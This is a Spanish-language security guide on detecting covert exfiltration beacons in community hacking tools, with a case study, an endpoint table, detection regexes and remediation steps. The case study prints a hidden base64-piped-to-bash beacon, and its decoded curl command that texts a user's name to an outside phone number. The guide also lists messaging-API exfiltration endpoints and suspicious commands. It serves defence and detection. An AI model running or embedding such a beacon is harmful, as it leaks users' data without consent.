# Guía Técnica: Detección y Auditoría de Telemetría Encubierta y Beacons de Exfiltración

Esta referencia técnica dota a los auditores y agentes de **Devia-CyberSecurity** de metodologías deterministas para identificar, aislar y mitigar canales de exfiltración clandestina, beacons de notificación por SMS/Webhooks y ofuscación de cargas útiles en scripts y herramientas de código abierto (`VULN-CRYP-005`).

---

## 🕵️ 1. Anatomía del Ataque: Beacons Clandestinos en Herramientas Comunitarias

En herramientas de administración, utilidades de pentesting o paquetes de automatización aparentemente legítimos, desarrolladores maliciosos o actores de amenaza con acceso a la cadena de suministro insertan rutinas encubiertas que transmiten telemetría no declarada, nombres de usuario, direcciones IP, tokens o identificadores de dispositivo hacia puntos de control del atacante.

### Mecanismo Observado (Caso de Estudio `AllHackingTools` - `.check/ServerConfig.sh`)
El autor insertó un archivo bash dentro de una carpeta oculta (`.check/`) conteniendo una tubería en Base64:
```bash
echo Y3VybCAtWCBQT1NUIGh0dHBzOi8vdGV4dGJlbHQuY29tL3RleHQgXAogICAgIC0tZGF0YS11cmxlbmNvZGUgcGhvbmU9JyszODA2NjkzNDE0ODknIFwKICAgICAtLWRhdGEtdXJsZW5jb2RlIG1lc3NhZ2U9JyR1c2VyIERvd25sb2FkINCQbGzQndCwa9GWbmfQotC+0L5scycgXAogICAgIC1kIGtleT10ZXh0YmVsdAo= | base64 -d | bash
```

Al decodificar la carga útil en memoria:
```bash
curl -X POST https://textbelt.com/text \
     --data-urlencode phone='+380669341489' \
     --data-urlencode message='$user Download \u0410ll\u041d\u0430k\u0456ng\u0422\u043e\u043els' \
     -d key=textbelt
```

### Técnicas de Evasión Utilizadas
1. **Doble Capa de Ocultamiento:** La llamada no se encuentra en el script raíz (`Install.sh`), sino que se delega a `Files/Modules.sh` que invoca `.check/ServerConfig.sh`.
2. **Ofuscación Base64 en Tubería Shell:** Impide que escáneres superficiales de texto plano o grep detecten URLs sospechosas.
3. **Sustitución de Homóglifos Cirílicos:** En la cadena `$user Download AllHackingTools`, los caracteres `A`, `H`, `a`, `i`, `T` y `o` fueron reemplazados por homóglifos cirílicos (`\u0410`, `\u041d`, `\u0430`, `\u0456`, `\u0422`, `\u043e`), eludiendo alertas automatizadas de búsquedas de strings y repositorios.

---

## 🎯 2. Taxonomía de Pasarelas de Exfiltración Comunes

Los atacantes recurren a servicios web legítimos y APIs públicas de mensajería para evadir reglas de firewall y sistemas EDR:

| Canal / Servicio | Endpoint / Indicador | Riesgo y Severidad |
| :--- | :--- | :--- |
| **TextBelt SMS API** | `https://textbelt.com/text` | **CRITICAL:** Envío de mensajes SMS a números móviles privados sin credenciales previas (`key=textbelt`). |
| **Twilio API** | `https://api.twilio.com/2010-04-01/Accounts/.../Messages` | **HIGH:** Despacho programático de SMS/WhatsApp utilizando cuentas de servicio. |
| **Discord Webhooks** | `https://discord.com/api/webhooks/<id>/<token>` | **CRITICAL:** Canal bidireccional frecuente de exfiltración de credenciales y registros de terminal. |
| **Telegram Bot API** | `https://api.telegram.org/bot<token>/sendMessage` | **CRITICAL:** Exfiltración sigilosa hacia canales o chats privados controlados por el atacante. |
| **Slack Incoming Webhooks** | `https://hooks.slack.com/services/...` | **HIGH:** Ingesta clandestina de eventos y variables de entorno en canales corporativos expuestos. |

---

## 🛡️ 3. Heurísticas y Reglas de Detección Estática

Todo proceso de escaneo de código fuente debe incorporar validaciones estáticas deterministas (implementadas en `src/scripts/scan_covert_telemetry.py`):

### 3.1. Detección de Tuberías Shell Ofuscadas
Cualquier patrón donde una cadena se decodifica con `base64` y se envía a un descriptor de shell (`| bash`, `| sh`, `| zsh`, `eval $(...)`) debe catalogarse como `CRITICAL` / `CWE-1027`:
```python
re.compile(r"""(?:echo\s+['"]?[A-Za-z0-9+/=]{16,}['"]?\s*\|\s*base64\s+(?:-d|--decode)\s*\|\s*(?:bash|sh|zsh|dash))""")
```

### 3.2. Decodificación Predictiva en Memoria
Al encontrar tokens candidatos de Base64 ($\ge 24$ caracteres), el analizador estático debe intentar decodificarlos deterministamente en memoria y verificar si el texto resultante contiene:
- Comandos CLI: `curl`, `wget`, `nc`, `python -c`, `chmod +x`, `rm -rf`.
- Protocolos de red: `http://`, `https://`, `ftp://`.
- Dominios de mensajería o exfiltración conocidos.

### 3.3. Detección de Tokens con Homóglifos Mezclados
Verificar si dentro del mismo token alfanumérico se combinan caracteres del alfabeto Latino básico (`[a-zA-Z]`) y caracteres cirílicos idénticos en forma visual:
```python
def is_homoglyph_spoofed(word: str) -> bool:
    has_latin = bool(re.search(r'[a-zA-Z]', word))
    has_cyrillic = bool(re.search(r'[\u0410\u0412\u0421\u0415\u041d\u0456\u0406\u041a\u041c\u041e\u0420\u0422\u0425\u0430\u0441\u0435\u043e\u0440\u0443\u0445]', word))
    return has_latin and has_cyrillic
```

---

## 📋 4. Plan de Remediación y Respuesta

1. **Erradicación Inmediata:** Eliminar permanentemente los scripts que contengan tuberías ofuscadas o llamadas a endpoints de mensajería no solicitados.
2. **Declaración Explícita de Telemetría (Opt-In):** Cualquier mecanismo de telemetría debe ser deshabilitado por defecto (`opt-in`), requerir consentimiento interactivo explícito del operador y dirigirse exclusivamente a infraestructura corporativa auditada.
3. **Inspección de Tráfico de Salida (Egress Filtering):** En entornos de desarrollo y auditoría, restringir el tráfico de red saliente en la estación o contenedor mediante reglas de firewall que bloqueen dominios no vinculados al proyecto analizado.
4. **Verificación Automatizada en CI/CD:** Incorporar `python src/scripts/scan_covert_telemetry.py . --json` en las puertas de calidad previas al empaquetado o commit de cualquier software.
